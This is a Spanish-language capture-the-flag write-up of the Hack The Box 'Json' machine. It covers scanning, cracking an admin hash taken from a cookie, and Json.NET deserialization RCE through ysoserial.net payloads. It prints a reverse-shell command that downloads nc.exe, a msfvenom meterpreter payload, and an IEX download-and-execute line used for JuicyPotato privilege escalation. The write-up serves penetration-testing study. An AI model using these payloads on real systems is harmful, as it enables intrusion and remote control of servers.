<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - Json (Active) :: sckull — HackTheBox Writeups, CTF</title>    
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.   
Javascript needs to be enabled to decrypt content       Nombre Json     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.158   Maker Cyb3rb0b    MASSCAN &amp;amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/json/" />


<link rel="stylesheet" href="/assets/style.css">


<link rel="stylesheet" href="/style.css">


<link rel="shortcut icon" href="/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - Json (Active) :: sckull — HackTheBox Writeups, CTF" />
<meta name="twitter:description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.   
Javascript needs to be enabled to decrypt content       Nombre Json     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.158   Maker Cyb3rb0b    MASSCAN &amp;amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos." />
<meta name="twitter:site" content="/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="/image/htb/json/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - Json (Active) :: sckull — HackTheBox Writeups, CTF">
<meta property="og:description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.   
Javascript needs to be enabled to decrypt content       Nombre Json     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.158   Maker Cyb3rb0b    MASSCAN &amp;amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos." />
<meta property="og:url" content="/posts/json/" />
<meta property="og:site_name" content="Hack The Box - Json (Active)" />
<meta property="og:image" content="/image/htb/json/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "/"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - Json (Active)",
        "headline" : "Hack The Box - Json (Active)",
        "description" : "Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.   
Javascript needs to be enabled to decrypt content       Nombre Json     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.158   Maker Cyb3rb0b    MASSCAN &amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2020",
        "datePublished": "2020-01-10 00:00:00 &#43;0000 UTC",
        "dateModified" : "2020-01-10 00:00:00 &#43;0000 UTC",
        "url" : "/posts/json/",
        "wordCount" : "1232",
        "keywords" : [ "hackthebox","windows","writeup","walkthrough","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2020-01-10 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">Hack The Box - Json (Active)</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Friday, Jan 10, 2020
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 6 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="/tags/hackthebox/"><li class="fa fa-tag"></li> hackthebox</a>&nbsp;
        
         <a class="button-tag" href="/tags/windows/"><li class="fa fa-tag"></li> windows</a>&nbsp;
        
         <a class="button-tag" href="/tags/writeup/"><li class="fa fa-tag"></li> writeup</a>&nbsp;
        
         <a class="button-tag" href="/tags/walkthrough/"><li class="fa fa-tag"></li> walkthrough</a>&nbsp;
        
      </span>
    

    
      
        <img src="/posts/json/../../image/htb/json/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      
    </div>

    <div class="post-content">      
      <ul>
<li><em>Contenido protegido por contraseña.</em></li>
<li><em>Para desbloquear el contenido debes Ingresar la flag <code>root.txt</code> de la maquina.</em></li>
</ul>


<hugo-encrypt>
	
	<div id="hugo-encrypt-encryption-notice">
		<p></p>
		<noscript><span id="hugo-encrypt-enable-js">Javascript needs to be enabled to decrypt content</span></noscript>

		<div class='hugo-encrypt-form'>
			<input
				class="hugo-encrypt-input"
				id="hugo-encrypt-password"
				placeholder=''
			/>
			<input
				class="button"
				type="button"
				value='Enviar '
				id="button" onclick="hugoDecrypt(document.getElementById('hugo-encrypt-password').value,'input')"
			/>
			<div id="hugo-encrypt-input-response"></div>
		</div>
	</div>
	<cipher-text data-password='3cc85d1bed2ee84af4074101b991d441' style="display:none;">
		<table>
<thead>
<tr>
<th>Nombre</th>
<th>Json</th>
</tr>
</thead>

<tbody>
<tr>
<td>OS</td>
<td>Linux</td>
</tr>

<tr>
<td>Puntos</td>
<td>30</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Media</td>
</tr>

<tr>
<td>IP</td>
<td>10.10.10.158</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://www.hackthebox.eu/home/users/profile/61047">Cyb3rb0b</a></td>
</tr>
</tbody>
</table>

<h2 id="masscan-nmap">MASSCAN &amp; NMAP</h2>

<p>Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos.</p>

<pre><code class="language-bash">root@kali:~/htb/json# masscan -p1-65535,U:1-65535 10.10.10.158 --rate=1000 -e tun0

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-30 22:56:02 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49153/tcp on 10.10.10.158                                 
Discovered open port 445/tcp on 10.10.10.158                                   
Discovered open port 5985/tcp on 10.10.10.158                                  
Discovered open port 139/tcp on 10.10.10.158                                   
Discovered open port 49155/tcp on 10.10.10.158                                 
Discovered open port 135/tcp on 10.10.10.158                                   
Discovered open port 47001/tcp on 10.10.10.158                                 
Discovered open port 49157/tcp on 10.10.10.158                                 
Discovered open port 21/tcp on 10.10.10.158                                    
Discovered open port 49152/tcp on 10.10.10.158

# Nmap 7.80 scan initiated Mon Sep 30 19:14:28 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.158
Warning: 10.10.10.158 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.158
Host is up (0.23s latency).
Not shown: 64567 closed ports, 954 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

# Nmap done at Mon Sep 30 19:19:17 2019 -- 1 IP address (1 host up) scanned in 289.09 seconds

# Nmap 7.80 scan initiated Mon Sep 30 19:20:55 2019 as: nmap -p 21,80,135,139,445,5985,47001 -sV -sC -o services_script.nmap 10.10.10.158
Nmap scan report for 10.10.10.158
Host is up (0.56s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc?
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h00m42s, deviation: 0s, median: 4h00m42s
|_nbstat: NetBIOS name: JSON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:bd:94:b0 (VMware)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-10-01T03:24:25
|_  start_date: 2019-10-01T00:14:50

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 30 19:24:33 2019 -- 1 IP address (1 host up) scanned in 217.67 seconds
</code></pre>

<h2 id="ftp">FTP</h2>

<p>Intentamos logearnos al servicio ftp con el usuario y contraseña anonymous pero no esta autorizado el usuario, tambien podemos ver la version del servicio ftp.</p>

<p><img src="../../image/htb/json/Screenshot from 2019-10-02 20.31.57.png" alt="image" /></p>

<h2 id="gobuster">GOBUSTER</h2>

<p>Algunos directorios y paginas encontradas con gobuster.</p>

<pre><code class="language-bash">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.158
[+] Threads:        15
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] No status:      true
[+] Timeout:        10s
===============================================================
2019/09/30 20:23:11 Starting gobuster
===============================================================
/css
/files
/img
/index.html
/Index.html
/index.html
/js
/login.html
/Login.html
/views
===============================================================
2019/09/30 20:35:16 Finished
===============================================================
</code></pre>

<h3 id="index-html">/index.html</h3>

<p>Visitamos el index de la pagina y nos muestra una plataforma.
<img src="../../image/htb/json/Screenshot from 2019-10-03 22.17.09.png" alt="image" /></p>

<h3 id="login-html">/login.html</h3>

<p>Vemos una pagina de inicio de sesion en esta pagina.</p>

<p>Verificamos las peticiones en index.html y encontramos que en el header existe una Cookie del tipo OAuth2 y tambien.
<img src="../../image/htb/json/Screenshot from 2019-10-03 23.20.42.png" alt="image" /></p>

<p>Decodificamos el string en base64 vemos el usuario y contraseña de admin.</p>

<pre><code class="language-json">{&quot;Id&quot;:1,&quot;UserName&quot;:&quot;admin&quot;,&quot;Password&quot;:&quot;21232f297a57a5a743894a0e4a801fc3&quot;,&quot;Name&quot;:&quot;User Admin HTB&quot;,&quot;Rol&quot;:&quot;Administrator&quot;}
</code></pre>

<p><img src="../../image/htb/json/Screenshot from 2019-10-03 23.55.22.png" alt="image" /></p>

<p>Buscamos el hash del usuario admin en crackstation.</p>

<pre><code class="language-bash">21232f297a57a5a743894a0e4a801fc3:admin
</code></pre>

<p><img src="../../image/htb/json/Screenshot from 2019-10-03 23.56.03.png" alt="image" /></p>

<p>Enviamos una solicitud erronea en base64, la cual contenia un mensaje del famoso &ldquo;Lorem ipsum&rdquo;.</p>

<p><img src="../../image/htb/json/Screenshot from 2019-10-03 23.50.27.png" alt="image" />
Vemos que dentro del mensaje de error nos muestra &ldquo;Cannot deserialize Json.Net Object&rdquo;.</p>

<h2 id="json-net-rce-deserialization">Json.net RCE - Deserialization</h2>

<p>Investigamos acerca del framework Json.net y vemos que existe una vulnerabilidad.</p>

<p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf"><strong>Json Attacks</strong></a></p>

<p>Utilizamos ysoserial.net para poder generar nuestro payload codificado y enviarlo a la maquina, para esto utilizamos el PoC y lo modificamos.</p>

<p>PoC:</p>

<pre><code class="language-json">{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/c calc']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
</code></pre>

<p>Realizamos dos pruebas uno para hacer ping a nuestra maquina local y uno para hacer una prueba de resolucion de dominios.</p>

<pre><code class="language-bash">./ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c &quot;ping -n 5 10.10.14.147&quot; -t &gt; payload_jsonnet_ping.txt

ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgcGluZyAtbiA1IDEwLjEwLjE0LjE0NyddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
</code></pre>

<pre><code class="language-bash">./ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c &quot;nslookup sckull 10.10.14.147&quot; -t &gt; payload_jsonnet_nslookup.txt

ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgbnNsb29rdXAgc2NrdWxsIDEwLjEwLjE0LjE0NyddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
</code></pre>

<p>Respuesta en Responder (nslookup) y tcpdump (ping).
<img src="../../image/htb/json/Screenshot from 2019-10-04 00.03.54.png" alt="image" /></p>

<h2 id="shell-userpool">SHELL - userpool</h2>

<p>Tomamos el PoC que utilizamos para hacer ping a nuestra maquina y lo modificamos agregandole un comando de powershell para descargar netcat (nc.exe) y, al mismo tiempo ejecutar una shell inversa con netcat.</p>

<p>Comando:</p>

<pre><code class="language-shell">powershell -Command &quot;Invoke-WebRequest http://10.10.14.147/nc.exe -OutFile c:/Users/Public/nc.exe&quot; &amp; C:/Users/Public/nc.exe -e cmd.exe 10.10.14.147 7878
</code></pre>

<p>Payload:</p>

<pre><code class="language-json">{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/c powershell -Command &quot;Invoke-WebRequest http://10.10.14.147/nc.exe -OutFile c:/Users/Public/nc.exe&quot; &amp; C:/Users/Public/nc.exe -e cmd.exe 10.10.14.147 7878 ']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
</code></pre>

<p>Payload Base64:</p>

<pre><code class="language-bash">ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgcG93ZXJzaGVsbCAtQ29tbWFuZCAiSW52b2tlLVdlYlJlcXVlc3QgaHR0cDovLzEwLjEwLjE0LjE0Ny9uYy5leGUgLU91dEZpbGUgYzovVXNlcnMvUHVibGljL25jLmV4ZSIgJiBDOi9Vc2Vycy9QdWJsaWMvbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMTQ3IDc4NzggJ10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0NCg==
</code></pre>

<p>Codificamos el payload en base64 y lo enviamos, y obtenemos una shell inversa con el usuario userpool.
<img src="../../image/htb/json/Screenshot from 2019-10-04 01.12.16.png" alt="image" /></p>

<p>Y obtenemos nuestra flag <strong>user.txt</strong>.
<img src="../../image/htb/json/Screenshot from 2019-10-04 01.13.09.png" alt="image" /></p>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<p>Realizamos una enumeracion de los privilegios del usuario userpool, vemos que tenemos habilitado
SeImpersonatePrivilege, para esta maquina y estos privilegios utilizamos JuicyPotato. Utilizamos la forma &ldquo;automatica&rdquo; de <a href="https://github.com/TsukiCTF/Lovely-Potato"><strong>JuicyPotato</strong></a>. Realizamos las siguientes modificaciones en los archivos.</p>

<pre><code class="language-powershell">Invoke-LovelyPotato.ps1
$RemoteDir = &quot;http://10.10.14.147&quot;
$LocalPath = &quot;C:/Users/Public&quot;
</code></pre>

<p>Creamos nuestro payload con Msfvenom:</p>

<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.147 LPORT=1339 -f exe -o meterpreter.exe
</code></pre>

<p>Configuramos metasploit:</p>

<pre><code class="language-bash">use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.147
set LPORT 1339
</code></pre>

<p>Descargamos el archivo de &ldquo;automatizacion&rdquo; de JuicyPotato:</p>

<pre><code class="language-shell">powershell -Command &quot;IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.147/Invoke-LovelyPotato.ps1')&quot;
</code></pre>

<p>Si queremos realizarlo de forma manual podemos realizar los mismos pasos de la Maquina <a href="https://sckullbock.blogspot.com/2019/05/hackthebox-conceal-writeup.html"><strong>Conceal</strong></a>.</p>

<p>Al terminar la ejecucion del script obtenemos nuestra shell en meterpreter.
<img src="../../image/htb/json/Screenshot from 2019-10-04 01.45.24.png" alt="image" /></p>

<p>Y nuestra flag <strong>root.txt</strong>.
<img src="../../image/htb/json/Screenshot from 2019-10-04 01.46.29.png" alt="image" /></p>

	</cipher-text>
	<style type="text/css">
		div#hugo-encrypt-sha1sum {display: none;}
		button, .button{  
			align-items: center;
			justify-content: center;
			padding: 8px 18px;
			margin-bottom: 5px;
			background: var(--dark-background-secondary);
			color: inherit;
			text-decoration: none;
			text-align: center;
			font-weight: 500;
			border-radius: 8px;
			border: 1px solid transparent;
			appearance: none;
			cursor: pointer;
			outline: none;
		  }
	</style>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/sha1.js"></script>
	<script>
		
		let cipher = document.getElementsByTagName("cipher-text")[0];
		const storageKey = location.pathname + "password";
		const userStorage =  window['sessionStorage'] ;
		

		function str2buf(str) {
			return new TextEncoder("utf-8").encode(str);
		}
		

		function buf2str(buffer) {
			return new TextDecoder("utf-8").decode(buffer);
		}
		

		function hex2buf(hexStr) {
			return new Uint8Array(hexStr.match(/.{2}/g).map(h => parseInt(h, 16)));
		}
		

		function deriveKey(passphrase, salt) {
			salt = salt || crypto.getRandomValues(new Uint8Array(8));
			return crypto.subtle
				.importKey("raw", str2buf(passphrase), "PBKDF2", false, ["deriveKey"])
				.then(key =>
					crypto.subtle.deriveKey(
						{ name: "PBKDF2", salt, iterations: 1000, hash: "SHA-256" },
						key,
						{ name: "AES-GCM", length: 256 },
						false,
						["encrypt", "decrypt"],
					),
				)
				.then(key => [key, salt]);
		}
		

		function decrypt(passphrase, saltIvCipherHex) {
			const [salt, iv, data] = saltIvCipherHex.split("-").map(hex2buf);
			return deriveKey(passphrase, salt)
				.then(([key]) => crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data))
				.then(v => buf2str(new Uint8Array(v)));
		}
		

		const hugoDecrypt = function(password, type) {
				decrypt(password, cipher.innerText).then(function(decrypted_text) {
					

					let hash = CryptoJS.SHA1(decrypted_text.replace(/\r?\n?[^\r\n]*$/, ""));
					let sha1_sum = CryptoJS.enc.Hex.stringify(hash);

					if ( decrypted_text.includes(sha1_sum) ) {
						document.getElementById("hugo-encrypt-encryption-notice").remove();
						cipher.outerHTML = decrypted_text;
						userStorage.setItem(storageKey, password);
						document.getElementById("hugo-encrypt-sha1sum").innerHTML = "Success: " + sha1_sum;
						$('pre').addClass('code-toolbar language-bash');
						$('code').addClass('language-bash');
                        console.log("Decryption successful. Storing password in sessionStorage.");
					}
					}).catch(function(error) {
                    if (type === "input") {
                        document.getElementById("hugo-encrypt-input-response").innerHTML = "";
                        console.log('', error);
                    } else if (type === "storage") {
                        userStorage.removeItem(location.pathname + "password");
                        console.log("Password changed. Clearing userStorage.", error);
                    }
                });
			};
	</script>
	<script>
		window.onload = () => {
			if (userStorage.getItem(storageKey)) {
				console.log("Found storageKey in userStorage. Attemtping decryption");
				hugoDecrypt(userStorage.getItem(storageKey), "storage");
			}
		};
	</script>
</hugo-encrypt>



    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="/posts/forest/">
                <span class="button__icon">←</span>
                <span class="button__text">Hack The Box - Forest (Active)</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="/posts/postman/">
                <span class="button__text">Hack The Box - Postman (Active)</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>

  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
